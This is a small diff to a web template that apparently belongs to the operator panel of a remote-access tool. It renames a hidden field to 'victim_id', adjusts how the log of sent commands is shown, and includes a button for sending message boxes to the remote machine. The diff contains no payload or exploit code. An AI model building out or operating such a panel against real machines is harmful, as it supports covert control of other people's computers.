@@ -11,7 +11,7 @@
         <section id="commands">
             <textarea id="output" disabled>
                 {% for command in commands %}
-                    {{ command.date }} {{ command.metaData }}
+                    {{ command.date|datetime('time') }} {{ command.metadata }}
                 {% endfor %}
             </textarea>
         </section>
@@ -19,7 +19,7 @@
         <input id="input" type="text" spellcheck="false">
         <input id="submitButton" type="button" value="Send">
         <input id="clearButton" type="button" value="Clear">
-        <input id="id" type="hidden" value="{{ id }}">
+        <input id="id" type="hidden" value="{{ victim_id }}">
     </div>
     <div class="right">
         <input class="function" type="button" data-function="msg" value="Send message box">
